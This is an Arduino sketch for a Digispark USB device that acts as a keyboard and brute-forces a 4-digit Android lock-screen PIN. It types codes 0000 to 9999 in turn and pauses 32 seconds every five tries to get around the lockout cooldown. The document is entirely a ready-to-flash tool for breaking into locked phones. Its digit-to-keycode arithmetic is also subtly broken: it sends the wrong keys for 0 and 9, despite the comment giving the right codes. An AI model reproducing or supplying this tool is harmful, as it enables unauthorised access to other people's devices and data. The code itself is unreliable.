#include "DigiKeyboard.h"

int pass = 0; // Current passcode being tried

void setup() {
  DigiKeyboard.delay(2000); // Initial delay to allow connection
}

void loop() {
  // Clear any previous input fields
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  // Convert integer passcode to 4-digit string and send
  int digit1 = (pass / 1000) % 10;
  int digit2 = (pass / 100) % 10;
  int digit3 = (pass / 10) % 10;
  int digit4 = pass % 10;

  // Send the digits as keyboard key strokes
  DigiKeyboard.sendKeyStroke(digit1 + 30); // 1-9 are 30-38, 0 is 39 in USB HID
  DigiKeyboard.sendKeyStroke(digit2 + 30);
  DigiKeyboard.sendKeyStroke(digit3 + 30);
  DigiKeyboard.sendKeyStroke(digit4 + 30);
  
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  pass++; // Move to next passcode
  
  // Reset after 9999
  if (pass > 9999) {
    pass = 0;
  }

  // Android Security: Wait 32 seconds every 5 attempts to bypass cooldown
  if (pass % 5 == 0) {
    DigiKeyboard.delay(32000); 
  } else {
    DigiKeyboard.delay(1000); // 1 second between normal attempts
  }
}
